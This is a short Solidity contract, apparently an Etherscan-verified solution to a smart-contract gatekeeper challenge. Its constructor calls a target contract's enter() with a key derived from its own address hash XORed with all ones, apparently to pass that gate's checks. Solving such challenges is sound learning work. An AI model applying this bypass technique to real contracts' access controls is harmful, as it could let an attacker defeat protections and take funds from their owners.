/**
 *Submitted for verification at Etherscan.io on 2022-06-20
*/

pragma solidity ^0.4.24;

contract Gate {
    function enter(bytes8) public returns (bool);
    function entrant() public view returns (address);
}

contract GateCrasher2 {

    Gate gate = Gate(0x57E57DD46132CBB8c91564E28a98992dd465B24e);

    constructor() public {
        gate.enter(bytes8(uint64(keccak256(abi.encodePacked(address(this)))) ^ (uint64(0) - 1)));
    }

    function verify() external view returns (bool) {
        return gate.entrant() == msg.sender;
    }
}